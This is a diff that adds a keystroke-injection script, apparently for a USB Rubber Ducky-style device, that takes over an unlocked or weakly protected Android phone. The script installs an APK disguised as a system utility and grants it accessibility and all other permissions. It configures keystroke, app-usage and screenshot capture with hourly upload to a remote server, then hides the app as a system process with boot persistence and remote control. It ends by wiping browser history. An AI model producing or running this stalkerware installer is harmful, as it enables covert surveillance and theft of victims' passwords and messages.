@@ -1,0 +1,372 @@
+REM Android Keylogger Installation
+REM Author: AryanVBW
+REM Version: 1.0
+REM Installs keylogger to capture all typed text and app usage
+
+REM ---- INITIAL SETUP ----
+DELAY 1500
+
+REM Wake up the device
+ENTER
+DELAY 500
+ENTER
+DELAY 1000
+
+REM Swipe up to unlock (universal method)
+SWIPE 500 1800 500 800
+DELAY 1500
+
+REM ---- STEP 1: ENABLE DEVELOPER OPTIONS ----
+
+REM Open Settings
+HOME
+DELAY 800
+SWIPE 500 1700 500 700
+DELAY 1000
+STRING settings
+DELAY 800
+ENTER
+DELAY 2000
+
+REM Navigate to About phone
+STRING about
+DELAY 800
+ENTER
+DELAY 1500
+
+REM Find Build Number
+STRING build
+DELAY 800
+ENTER
+DELAY 1500
+
+REM Tap on Build Number 7 times
+REPEAT 7 {
+    ENTER
+    DELAY 300
+}
+DELAY 1500
+
+REM Enter PIN/pattern if prompted
+STRING 1234
+DELAY 800
+ENTER
+DELAY 1500
+
+REM ---- STEP 2: INSTALL KEYLOGGER APP ----
+
+REM Go to Chrome
+HOME
+DELAY 800
+SWIPE 500 1700 500 700
+DELAY 1000
+STRING chrome
+DELAY 800
+ENTER
+DELAY 3000
+
+REM Access address bar
+TAB
+DELAY 500
+ENTER
+DELAY 1000
+
+REM Enter URL for keylogger app (disguised as a utility app)
+STRING https://example.com/system-utility.apk
+DELAY 1000
+ENTER
+DELAY 5000
+
+REM Wait for download to complete
+DELAY 10000
+
+REM Open notification shade
+SWIPE 500 100 500 1700
+DELAY 1500
+
+REM Tap on download notification
+ENTER
+DELAY 3000
+
+REM Install the app
+STRING install
+DELAY 800
+TAB
+DELAY 300
+TAB
+DELAY 300
+ENTER
+DELAY 5000
+
+REM ---- STEP 3: GRANT ACCESSIBILITY PERMISSIONS ----
+
+REM Go to Settings
+HOME
+DELAY 800
+SWIPE 500 1700 500 700
+DELAY 1000
+STRING settings
+DELAY 800
+ENTER
+DELAY 2000
+
+REM Navigate to Accessibility
+STRING accessibility
+DELAY 800
+ENTER
+DELAY 1500
+
+REM Find the keylogger app (disguised name)
+STRING system
+DELAY 800
+ENTER
+DELAY 1500
+
+REM Enable service
+TAB
+DELAY 300
+ENTER
+DELAY 1000
+
+REM Confirm enabling (critical for keylogging)
+STRING allow
+DELAY 800
+TAB
+DELAY 300
+TAB
+DELAY 300
+ENTER
+DELAY 2000
+
+REM ---- STEP 4: GRANT ADDITIONAL PERMISSIONS ----
+
+REM Go to Apps settings
+BACK
+DELAY 800
+BACK
+DELAY 800
+STRING apps
+DELAY 800
+ENTER
+DELAY 1500
+
+REM Find the keylogger app
+STRING system
+DELAY 800
+ENTER
+DELAY 1500
+
+REM Go to Permissions
+STRING permissions
+DELAY 800
+ENTER
+DELAY 1500
+
+REM Grant all permissions
+REPEAT 10 {
+    TAB
+    DELAY 300
+    ENTER
+    DELAY 1000
+    STRING allow
+    DELAY 500
+    ENTER
+    DELAY 800
+    BACK
+    DELAY 800
+}
+
+REM ---- STEP 5: CONFIGURE KEYLOGGER SETTINGS ----
+
+REM Launch the keylogger app
+HOME
+DELAY 800
+SWIPE 500 1700 500 700
+DELAY 1000
+STRING system
+DELAY 800
+ENTER
+DELAY 2000
+
+REM Configure data collection settings
+TAB
+DELAY 300
+TAB
+DELAY 300
+ENTER
+DELAY 1000
+
+REM Enable keyboard logging
+STRING keyboard
+DELAY 800
+TAB
+DELAY 300
+ENTER
+DELAY 1000
+
+REM Enable app usage tracking
+STRING app usage
+DELAY 800
+TAB
+DELAY 300
+ENTER
+DELAY 1000
+
+REM Enable screenshot capture
+STRING screenshot
+DELAY 800
+TAB
+DELAY 300
+ENTER
+DELAY 1000
+
+REM Set data upload frequency
+STRING upload
+DELAY 800
+ENTER
+DELAY 1000
+STRING hourly
+DELAY 800
+ENTER
+DELAY 1000
+
+REM Configure remote server
+STRING server
+DELAY 800
+ENTER
+DELAY 1000
+STRING https://example.com/data
+DELAY 800
+ENTER
+DELAY 1000
+
+REM ---- STEP 6: HIDE THE APP ----
+
+REM Hide app icon from launcher
+STRING hide icon
+DELAY 800
+TAB
+DELAY 300
+ENTER
+DELAY 1000
+STRING confirm
+DELAY 800
+ENTER
+DELAY 1500
+
+REM ---- STEP 7: SETUP PERSISTENCE ----
+
+REM Enable auto-start on boot
+STRING autostart
+DELAY 800
+TAB
+DELAY 300
+ENTER
+DELAY 1000
+
+REM Disable battery optimization
+STRING battery
+DELAY 800
+ENTER
+DELAY 1000
+STRING disable
+DELAY 800
+ENTER
+DELAY 1000
+
+REM ---- STEP 8: SETUP STEALTH MODE ----
+
+REM Enable stealth mode
+STRING stealth
+DELAY 800
+TAB
+DELAY 300
+ENTER
+DELAY 1000
+
+REM Disguise as system process
+STRING system process
+DELAY 800
+ENTER
+DELAY 1000
+STRING android.system
+DELAY 800
+ENTER
+DELAY 1000
+
+REM ---- STEP 9: SETUP REMOTE CONTROL ----
+
+REM Enable remote commands
+STRING remote
+DELAY 800
+TAB
+DELAY 300
+ENTER
+DELAY 1000
+
+REM Set authentication token
+STRING token
+DELAY 800
+ENTER
+DELAY 1000
+STRING a1b2c3d4e5f6
+DELAY 800
+ENTER
+DELAY 1000
+
+REM ---- STEP 10: START THE SERVICE ----
+
+REM Start the keylogger service
+STRING start
+DELAY 800
+ENTER
+DELAY 2000
+
+REM ---- STEP 11: CLEAN UP TRACES ----
+
+REM Clear browser history
+HOME
+DELAY 800
+SWIPE 500 1700 500 700
+DELAY 1000
+STRING chrome
+DELAY 800
+ENTER
+DELAY 3000
+
+REM Open Chrome menu
+TAB
+DELAY 300
+TAB
+DELAY 300
+TAB
+DELAY 300
+ENTER
+DELAY 1000
+
+REM Go to History
+STRING history
+DELAY 800
+ENTER
+DELAY 1500
+
+REM Clear browsing data
+STRING clear
+DELAY 800
+ENTER
+DELAY 1500
+STRING all time
+DELAY 800
+ENTER
+DELAY 1000
+STRING clear data
+DELAY 800
+ENTER
+DELAY 2000
+
+REM ---- FINISHED ----
+REM Keylogger is now active and hidden
+
+REM Return to home screen
+HOME
+DELAY 800
